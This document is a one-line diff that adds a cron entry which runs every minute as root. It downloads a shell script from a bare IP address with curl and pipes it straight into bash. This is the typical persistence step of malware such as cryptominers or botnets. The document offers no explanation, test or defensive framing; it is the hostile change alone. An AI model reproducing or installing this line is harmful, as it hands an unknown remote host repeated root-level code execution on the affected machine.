@@ -1,0 +1,1 @@
+* * * * * root curl http://205.185.118.246/b2f628/cronb.sh|bash
